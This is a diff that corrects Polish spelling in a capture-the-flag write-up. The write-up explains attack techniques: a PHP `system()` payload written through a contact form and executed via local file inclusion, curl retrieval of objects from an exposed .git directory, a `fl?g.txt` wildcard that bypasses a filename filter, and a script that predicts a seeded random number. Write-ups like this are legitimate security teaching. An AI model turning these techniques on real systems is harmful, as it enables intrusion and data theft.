@@ -14,7 +14,7 @@ Kopiuj - wklej flagę z opisu zadania ;)
 
 ### Śmieszna maupa
 
-Flaga ukryta w modelu 3D głowy małpy, aby znaleźć flagę należało ściągnać plik źródłowy monki.glb i odpalić go w dowolnym programie do edycji 3D (ja użyłem Blendera):
+Flaga ukryta w modelu 3D głowy małpy, aby znaleźć flagę należało ściągnąć plik źródłowy monki.glb i odpalić go w dowolnym programie do edycji 3D (ja użyłem Blendera):
 
 ```html
 <model-viewer bounds="tight" src="monki.glb" ar="" ar-modes="webxr scene-viewer quick-look" camera-controls="" environment-image="aircraft_workshop_01_1k.hdr" poster="poster.webp" shadow-intensity="1" exposure="0.45" data-js-focus-visible="" ar-status="not-presenting" class="">
@@ -49,17 +49,17 @@ Flaga zakodowana w base64 (do odkodowania można użyć cyberchefa albo dowolneg
 
 ### Jak zostałem hackerem
 
-Muszę przyznać, że to zadanie zadało mi sporo trudu dopóki nie zauważyłem ledwo widocznego logo DEFCON w prawym dolnym rogu. Wtedy już było łatwiej, wystarczyło przeszkoać filmiki ze starszych DEFCONów pod wzgledem słów kluczowych jak irc, gibson itd.
+Muszę przyznać, że to zadanie zadało mi sporo trudu, dopóki nie zauważyłem ledwo widocznego logo DEFCON w prawym dolnym rogu. Wtedy już było łatwiej, wystarczyło przeszukać filmiki ze starszych DEFCONów pod względem słów kluczowych jak irc, gibson itd.
 
 ![YouTube](img/img.png)
 
-Ostatecznie, zapytanie które naprowadziło mnie na rozwiązanie to "defcon gibson". flaga byłą w najnowszym komentarzu pod następującym filmem: https://www.youtube.com/watch?v=fWk_rMQiDGc&ab_channel=DEFCONConference
+Ostatecznie zapytanie, które naprowadziło mnie na rozwiązanie to "defcon gibson". flaga byłą w najnowszym komentarzu pod następującym filmem: https://www.youtube.com/watch?v=fWk_rMQiDGc&ab_channel=DEFCONConference
 
 ## WEB
 
 ### Klikzarzutka
 
-Aby dostać flagę, należało kliknać capcthe 10 000 razy, albo edytować odpowiednie zapytanie w Burp:
+Aby dostać flagę, należało kliknąć capcthe 10 000 razy, albo edytować odpowiednie zapytanie w Burp:
 
 ![Captcha](img/captcha.png)
 
@@ -69,7 +69,7 @@ Dostaliśmy starą wersję strony z kilkoma błędami. Niezbyt dużo czasu zajmo
 
 ![Captcha](img/lfi.png)
 
-Niestety znalezienie flagi w ten sposób nie było trywialne. Jednak na stronie istniał również formularz kontaktowy, który pozwalał nam zapisywać pliki po stronei serwera. Łącząc te 2 podatności, mogliśmy uzyskać proste wykonanie kodu (RCE) i znaleźć flagę. Jako treść wiadomości wystarczyło podać kod php z komendą systemową:
+Niestety znalezienie flagi w ten sposób nie było trywialne. Jednak na stronie istniał również formularz kontaktowy, który pozwalał nam zapisywać pliki po stronie serwera. Łącząc te 2 podatności, mogliśmy uzyskać proste wykonanie kodu (RCE) i znaleźć flagę. Jako treść wiadomości wystarczyło podać kod php z komendą systemową:
 
 ```php
 <?php
@@ -77,7 +77,7 @@ system('ls');
 ?>
 ```
 
-Zapisany plik byłzwracany w postaci błędu: `Warning: Can't attach data from file: data/6225875d267b7.txt in /var/www/html/index.php on line 12`
+Zapisany plik był zwracany w postaci błędu: `Warning: Can't attach data from file: data/6225875d267b7.txt in /var/www/html/index.php on line 12`
 
 Teraz wystarczyło wykorzystać LFI aby go wykonać:
 
@@ -87,21 +87,21 @@ W zwrotce dostawaliśmy listing katalogu:
 
 `data home.html index.php kontakt.html logo.png onas.html this_is_the_file_containg_our_flag.txt zespol.html`
 
-Po czym juz spokojnie mogliśmy odczytać flagę za pomocą LFI:
+Po czym już spokojnie mogliśmy odczytać flagę za pomocą LFI:
 
 `http://165.232.88.198/?page=this_is_the_file_containg_our_flag.txt`
 
 ### Gildia Internetowych trolli
 
-Nieco bardziej skomplikowane zadanie, wymagało trochę znajomości internalsów GITa. Szczerze nie jestem pewny czy zrobiłem je w najprostszy możliwy sposób i moze założone rozwiazanie było odrobine prostsze.
+Nieco bardziej skomplikowane zadanie, wymagało trochę znajomości internalsów GITa. Szczerze nie jestem pewny czy zrobiłem je w najprostszy możliwy sposób i może założone rozwiązanie było odrobine prostsze.
 
-W opisie zadania dostawaliśmy link do storny na której byłą flaga ale w formie ocenzurowanej i log z DirBustera, który dawał nam jeden katalog: 
+W opisie zadania dostawaliśmy link do strony na której byłą flaga ale w formie ocenzurowanej i log z DirBustera, który dawał nam jeden katalog: 
 
 `https://1753ctf.ams3.digitaloceanspaces.com/g/.git/HEAD`
 
-To pokazywało nam, ze jest tam dostepne repozytorium GIT. Wiedząc, że mamy doczynienia z gitem, mogliśmy siędomyślić, że w zadaniu chodzi o znalezienie poprzedniej wersji strony w repozytorium. Jednak próby zwykłego sklonowania repo kończyły się kodem 403 (przynajmniej w moim wypadku). Natomiast mogliśmy uzyskiwać dostęp do poszczególnych obiektów w podkatalogu .git. 
+To pokazywało nam, że jest tam dostępne repozytorium GIT. Wiedząc, że mamy do czynienia z gitem, mogliśmy się domyślić, że w zadaniu chodzi o znalezienie poprzedniej wersji strony w repozytorium. Jednak próby zwykłego sklonowania repo kończyły się kodem 403 (przynajmniej w moim wypadku). Natomiast mogliśmy uzyskiwać dostęp do poszczególnych obiektów w podkatalogu .git. 
 
-Aby wiedzieć jak odczytać dane z tego podkatalogu, trzeba mieć troche wiedzy o tym jak działa git. Sam nie jestem ekspertem z tego zakresu, wiecp olecam przeczytać ten artykuł, który naprowadził mnie na rozwiązanie: https://matthew-brett.github.io/curious-git/git_object_types.html
+Aby wiedzieć jak odczytać dane z tego podkatalogu, trzeba mieć trochę wiedzy o tym jak działa git. Sam nie jestem ekspertem z tego zakresu, więc polecam przeczytać ten artykuł, który naprowadził mnie na rozwiązanie: https://matthew-brett.github.io/curious-git/git_object_types.html
 
 Generalnie w `https://1753ctf.ams3.digitaloceanspaces.com/g/.git/HEAD` mamy referencje do ostatniego obiektu typu commit:
 
@@ -130,7 +130,7 @@ $ mkdir 79
 $ curl --output "79/5727cd49e0c4f49581151c9ec6bd856650f842" https://1753ctf.ams3.digitaloceanspaces.com/g/.git/objects/79/5727cd49e0c4f49581151c9ec6bd856650f842
 ```
 
-Teraz majac ściągniety odpowiedni obiekt, mozemy go odczytać. Jest on w formie binarnej, wiec zwykły cat nie dużo nam da, ale mozemy użyć komendy `git cat-file -p 795727cd49e0c4f49581151c9ec6bd856650f842` która pozwoli nam odczytać zawartosć tego pliku:
+Teraz mając ściągnięty odpowiedni obiekt, możemy go odczytać. Jest on w formie binarnej, więc zwykły cat nie dużo nam da, ale możemy użyć komendy `git cat-file -p 795727cd49e0c4f49581151c9ec6bd856650f842` która pozwoli nam odczytać zawartość tego pliku:
 
 ```
 $ git cat-file -p 795727cd49e0c4f49581151c9ec6bd856650f842
@@ -144,7 +144,7 @@ stylowanko
 
 Mamy tu kilka ważnych informacji, przede wszystkim widzimy hash obiektu typu "tree" powiązanego z tym commitem, po drugie widzimy parent commit. Oprócz tego mamy informacje o autorze i komentarz do danego commita.
 
-Powtózmy wiec proces wypracowany wcześniej aby odczytać zawartosć obiektu typu tree:
+Powtórzmy wiec proces wypracowany wcześniej aby odczytać zawartość obiektu typu tree:
 
 ```
 $ mkdir bb
@@ -153,7 +153,7 @@ $ git cat-file -p bb267f6a5f9435055601fd827b9d863fa50374be
 100644 blob 9930221ea79d7877c2b143675f2999080c21e116    index.html
 ```
 
-W efekcie dostajemy hash obiektu typu blob, który zawiera już dane naszego pliku wrzuconego na gita, reiterując poprzedni proces mozemy wyświetlić zawartosć tego pliku:
+W efekcie dostajemy hash obiektu typu blob, który zawiera już dane naszego pliku wrzuconego na gita, reiterując poprzedni proces możemy wyświetlić zawartość tego pliku:
 
 ```
 $ mkdir 99
@@ -162,7 +162,7 @@ $ git cat-file -p 9930221ea79d7877c2b143675f2999080c21e116
 <h1>Flaga w tym zadaniu to 1753c{***********}</h1>
 ```
 
-Dostaliśmy więc zawartosć pliku z obecnego commita, czyli de facto to samo co możemy zobaczyć na stronie. Jak wiec znaleźc poprzednie wersje pliku? Pamiętacie obiekt parent w naszym commicie? Otóż jest to hash poprzedniego commita, w ten sposób reiterujac nasz proces możemy sprawdzić zawartosc poprzednich commitów. Mozemy też pójść na skróty i wylistować wszystkie commity wraz z ich rodzicami za pomocą logów GIT dostępnych w katalogu logs:
+Dostaliśmy więc zawartość pliku z obecnego commita, czyli de facto to samo co możemy zobaczyć na stronie. Jak wiec znaleźć poprzednie wersje pliku? Pamiętacie obiekt parent w naszym commicie? Otóż jest to hash poprzedniego commita, w ten sposób reiterujac nasz proces możemy sprawdzić zawartość poprzednich commitów. Możemy też pójść na skróty i wylistować wszystkie commity wraz z ich rodzicami za pomocą logów GIT dostępnych w katalogu logs:
 
 ```
 $ curl https://1753ctf.ams3.digitaloceanspaces.com/g/.git/logs/refs/heads/master
@@ -171,7 +171,7 @@ e9129429abef9b6a7506582931ac0fee0235ca74 e5c87aa73fcb1536dddfede926583ef2e0c83f9
 e5c87aa73fcb1536dddfede926583ef2e0c83f9d 795727cd49e0c4f49581151c9ec6bd856650f842 Łukasz Wroński <lukasz@lukaszwronski.pl> 1645961948 +0100     commit: stylowanko
 ```
 
-W ten sposób mozemy pominać kroki posrednie i znajdowanie commitów iteracyjne i powtórzyc nasz proces od razu dla pierwszego commita (e9129429abef9b6a7506582931ac0fee0235ca74):
+W ten sposób możemy pominąć kroki pośrednie i znajdowanie commitów iteracyjne i powtórzyć nasz proces od razu dla pierwszego commita (e9129429abef9b6a7506582931ac0fee0235ca74):
 
 ```
 $ mkdir e9
@@ -196,11 +196,11 @@ I mamy naszą flagę!
 
 Pierwsze zadanie to szyfr podstawieniowy: https://en.wikipedia.org/wiki/Substitution_cipher
 
-Jest kilka stron, które pomogą automatycznei rozwiazać szyfr podstawieniowy. Ja skorzystałem z tej: https://www.guballa.de/substitution-solver
+Jest kilka stron, które pomogą automatycznie rozwiązać szyfr podstawieniowy. Ja skorzystałem z tej: https://www.guballa.de/substitution-solver
 
 ### Scrypto
 
-Drugie zadanie to prosta obfuskacja gdzie w pętli for do wartosci bajtowej znaku dodawana jest wartość licznika pętli. Prosty skrypt odwracajacy to działanie pozwala nam odzyskać flagę:
+Drugie zadanie to prosta obfuskacja gdzie w pętli for do wartości bajtowej znaku dodawana jest wartość licznika pętli. Prosty skrypt odwracający to działanie pozwala nam odzyskać flagę:
 
 ```python
 f = open("enc.bin","rb")
@@ -218,19 +218,19 @@ print(flag)
 
 ### Egzamin z angielskiego
 
-W zadaniu mamy prosty program z filtrem nie pozwalającym nam wylistować zawartosci pliku flag.txt bezpośrednio, ale mogliśmy listować zawartość innych plików. Niezamierzone (potwierdozne przez autora) rozwiązanie tego zadania jest bardzo proste, wystarczy wpisać w konsoli:
+W zadaniu mamy prosty program z filtrem nie pozwalającym nam wylistować zawartości pliku flag.txt bezpośrednio, ale mogliśmy listować zawartość innych plików. Niezamierzone (potwierdzone przez autora) rozwiązanie tego zadania jest bardzo proste, wystarczy wpisać w konsoli:
 
 `fl?g.txt`
 
-Zastępujac jeden ze znaków pliku znakiem zapytania, który w powłoce linuxowej jest znakiem typu wildcard zastępujacą pojedynczy znak. Pozwala nam to ominąć filtr i wyświetlić zawartosć pliku.
+Zastępując jeden ze znaków pliku znakiem zapytania, który w powłoce linuxowej jest znakiem typu wildcard zastępującą pojedynczy znak. Pozwala nam to ominąć filtr i wyświetlić zawartość pliku.
 
-Zamierzone rozwiazanie było prawdopodobnie minimalnie cięższe.
+Zamierzone rozwiązanie było prawdopodobnie minimalnie cięższe.
 
 ### Kontrola umysłu
 
-Dostajemy plik źródłowy skryptu pythona działajacego po stronie serwera, zadanie polegan a przewidzeniu kolejnej wylosowanej liczby.
+Dostajemy plik źródłowy skryptu pythona działającego po stronie serwera, zadanie polega na przewidzeniu kolejnej wylosowanej liczby.
 
-Zadanie wykorzystujące fakt, że algorytmy pseudolosowe w komputerach wygenerują zawsze tę samą wartość "losową" kiedy podamy im ten sam seed (wartość wstępną). Zadanie jest o tyle proste, że seed jest nam bezpośrednio podawany przez serwer, więc możemy w bardzo prosty sposób obliczyć kolejną wartosć, po prostu wykonując operację randint na tym samej wartości seed. Jedyne utrudnienie polega na fakcie, że odpowiedź należy podać w czasie ponięzej 1 sekundy, inaczej dostaniemy komunikat, że byliśmy za wolni. To znaczy, ze komunikację z serwerem musimy sobie oskryptować. Prosty skrypt w pythonie rozwiazujący to zadanie poniżej:
+Zadanie wykorzystujące fakt, że algorytmy pseudolosowe w komputerach wygenerują zawsze tę samą wartość "losową" kiedy podamy im ten sam seed (wartość wstępną). Zadanie jest o tyle proste, że seed jest nam bezpośrednio podawany przez serwer, więc możemy w bardzo prosty sposób obliczyć kolejną wartość, po prostu wykonując operację randint na tym samej wartości seed. Jedyne utrudnienie polega na fakcie, że odpowiedź należy podać w czasie poniżej 1 sekundy, inaczej dostaniemy komunikat, że byliśmy za wolni. To znaczy, że komunikację z serwerem musimy sobie oskryptować. Prosty skrypt w pythonie rozwiązujący to zadanie poniżej:
 
 ```python
 import socket
